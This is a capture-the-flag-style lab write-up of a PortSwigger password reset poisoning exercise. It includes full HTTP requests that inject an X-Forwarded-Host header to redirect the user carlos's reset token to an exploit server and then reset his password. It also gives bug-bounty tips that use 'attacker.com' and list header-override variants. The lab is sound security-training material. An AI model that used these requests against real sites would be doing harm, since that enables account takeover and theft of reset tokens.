# LAB: Password reset poisoning via middleware

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Authentication (Other mechanisms)                                                                                             |
| **Difficulty**              | Practitioner                                                                                                                 |
| **Date**                    | 2026-11-20                                                                                                                   |
| **Time**                    |      15                                                                                                                          |
| **Solved without solution** | yes                                                                                                                                 |
| **Link**                    | [lab-password-reset-poisoning-via-middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware) |

## 1. Objective

Exploit host header override / middleware header parsing vulnerabilities in the password reset workflow to poison the reset link delivered to the target user (`carlos`), exfiltrate their reset token, and reset their password to gain access to their account.

## 2. Surface

- Password reset request endpoint (`/forgot-password`).
- HTTP request headers processed by front-end proxy / middleware (`X-Forwarded-Host`).
- Exploit server access log listener.
- Target user account (`carlos`).

## 3. Hypothesis

If the backend framework or intermediate reverse proxy dynamically constructs absolute URLs for password reset emails using override headers like `X-Forwarded-Host` without strictly validating them against a server-side whitelist, an attacker can inject an arbitrary domain into the password reset email sent to a target user. When the victim clicks the link, their reset token will be sent directly to the attacker-controlled server.

## 4. Payload that worked

Request:
```http
POST /forgot-password HTTP/2
Host: <host>.web-security-academy.net
X-Forwarded-Host: exploit-xxxxxxx.exploit-server.net
Cookie: session=sess
Content-Length: 15
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://<host>.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=carlos
```
```http
POST /forgot-password?temp-forgot-password-token=mdv4sj3xzg83irzf335v1hfbbvjjqxkc HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Content-Length: 101
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://<host>.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/forgot-password?temp-forgot-password-token=mdv4sj3xzg83irzf335v1hfbbvjjqxkc
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

temp-forgot-password-token=1f3509tvmjvlijw95gau1ezffq1qbaf5&new-password-1=peter&new-password-2=peter
```

Response:
```http
HTTP/2 302 Found
Location: /
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## 5. Why it works

The vulnerability occurs because the backend framework constructs the absolute URL for the password reset link using the client-supplied `X-Forwarded-Host` HTTP header instead of relying on a trusted, hardcoded server configuration. Intermediate proxies or application middleware forward this header to the backend application, which dynamically parses it to build the reset link domain (e.g., `https://[X-Forwarded-Host]/forgot-password?temp-token=...`). 

When a reset request is submitted for `carlos` with `X-Forwarded-Host: [exploit-server-id].exploit-server.net`, the application generates a legitimate, valid reset token bound to `carlos`, but embeds it inside a link pointing to the attacker's exploit server. Once the victim receives the email and clicks the poisoned link, their browser issues an HTTP `GET` request containing the valid `temp-token` directly to the exploit server. The attacker reads the token from the HTTP access logs and submits it back to the legitimate application server to override `carlos`'s password.

## 6. What I tried that failed

- Attempted to replace the standard `Host` header directly with the exploit server domain (`Host: [exploit-server-id].exploit-server.net`). This failed because the front-end proxy or routing layer failed to route the request to the application backend, resulting in direct redirects or status errors from the edge server.
- Initial attempts to trigger password reset links without header manipulation failed to exfiltrate the token because the application naturally defaulted to sending links pointing to the legitimate domain.
- Rule extracted: When direct `Host` header modification breaks request routing or triggers edge server redirects, test middleware override headers (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`) to evaluate if the application backend trusts intermediate proxy headers for absolute URL generation.
  
## 7. In a real target (bounty translation)

- Where it shows up: Multi-tiered web architectures using reverse proxies, load balancers, or API gateways where backend applications dynamically generate full URLs (e.g., reset links, confirmation emails) based on incoming HTTP request headers rather than fixed server configuration settings.
- Quick detection: Submit a password reset request for your own account while intercepting the request in Burp Suite. Add headers such as `X-Forwarded-Host: attacker.com`, `X-Host`, or `X-Forwarded-Server`. Check the generated email to verify if the link domain was replaced.
- Impact: Unauthenticated account takeover of any target user by stealing single-use password reset tokens via email poisoning.
- In the report: Provide the initial reset request showing the header injection, the raw log entry demonstrating token capture, and the final reset request confirming account access.

## 8. Bypass / variants noticed

- Testing secondary override headers such as `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, or `X-HTTP-Host-Override` when primary `Host` header rewriting fails or breaks TLS/routing.
- Supplying duplicate `Host` headers or combining parameter pollution within headers (e.g., `Host: target.com` with `X-Forwarded-Host: attacker.com`) to bypass naive front-end whitelist validation while still poisoning backend link generation.
- Exploiting Host header poisoning in other email-based workflows, such as account registration confirmation links, change-of-email verifications, or magic login links.

## 9. Takeaway

Web applications must never trust client-controlled headers like `Host` or `X-Forwarded-Host` when constructing URLs for sensitive workflows such as password resets. Dynamic URL generation should strictly use hardcoded base domains defined in secure server-side configuration files.
